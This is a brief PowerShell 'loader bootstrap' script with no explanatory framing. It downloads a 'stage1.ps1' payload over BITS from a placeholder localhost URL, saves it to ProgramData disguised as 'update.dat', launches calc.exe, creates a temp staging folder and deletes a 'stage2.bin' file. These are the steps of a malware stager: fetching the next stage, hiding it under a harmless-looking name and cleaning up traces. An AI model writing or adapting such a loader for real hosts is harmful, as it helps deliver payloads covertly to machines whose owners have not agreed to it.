<# Loader bootstrap #>
[CmdletBinding()]
param(
    [string]$TransferUrl = 'https://localhost:8080/stage1.ps1',
    [string]$DropPath = "C:\ProgramData\update.dat",
    [int]$TransferTimeout = 187
)
Start-BitsTransfer -Source $TransferUrl -Destination $DropPath
Start-Process -FilePath "calc.exe"
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
